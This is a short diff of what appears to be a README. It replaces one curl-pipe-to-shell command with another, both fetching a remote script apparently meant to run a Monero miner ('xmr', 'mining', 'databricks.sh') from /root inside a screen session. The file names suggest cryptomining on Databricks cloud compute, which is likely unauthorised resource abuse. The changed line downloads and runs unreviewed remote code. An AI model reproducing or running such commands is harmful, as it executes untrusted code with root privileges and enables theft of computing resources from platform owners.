@@ -2,7 +2,7 @@
 ```
 cd /root
 screen -R xmr
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/databricks.sh | sh
+curl https://raw.githubusercontent.com/igoz89/mining/main/databrick.sh | sh
 ```
 
 # auto connect
